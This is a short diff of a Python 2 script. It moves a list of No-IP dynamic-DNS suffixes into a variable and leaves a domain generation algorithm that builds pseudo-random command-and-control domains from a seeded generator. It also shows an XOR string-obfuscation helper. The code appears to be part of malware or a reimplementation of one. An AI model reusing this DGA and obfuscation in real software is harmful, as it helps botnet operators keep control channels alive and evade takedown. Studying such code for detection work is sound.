@@ -11,6 +11,7 @@ import time
 def xor_config(word):
     return ''.join([chr(ord(v) ^ ord("n3cr0t0r_freakout"[i % 17])) for i, v in enumerate(word)])
 
+noip = ["ddns.net","ddnsking.com","3utilities.com","bounceme.net","freedynamicdns.net","freedynamicdns.org","gotdns.ch","hopto.org","myddns.me","myftp.biz","myftp.org","myvnc.com","onthewifi.com","redirectme.net","servebeer.com","serveblog.net","servecounterstrike.com","serveftp.com","servegame.com","servehalflife.com","servehttp.com","serveirc.com","serveminecraft.net","servemp3.com","servepics.com","servequake.com","sytes.net","viewdns.net","webhop.me","zapto.org"]
 
 counter_=0
 
@@ -22,7 +23,7 @@ while 1:
         break
     counter_+=1
     random.seed(a=0xFAFFDED00001 + counter_)#generate seed for DGA (python 2 only)
-    c2domain =(''.join(random.choice("abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randrange(10,19)))).lower()+"."+random.choice(["ddns.net","ddnsking.com","3utilities.com","bounceme.net","freedynamicdns.net","freedynamicdns.org","gotdns.ch","hopto.org","myddns.me","myftp.biz","myftp.org","myvnc.com","onthewifi.com","redirectme.net","servebeer.com","serveblog.net","servecounterstrike.com","serveftp.com","servegame.com","servehalflife.com","servehttp.com","serveirc.com","serveminecraft.net","servemp3.com","servepics.com","servequake.com","sytes.net","viewdns.net","webhop.me","zapto.org"])
+    c2domain =(''.join(random.choice("abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randrange(10,19)))).lower()+"."+random.choice(noip)
     print c2domain
 
     
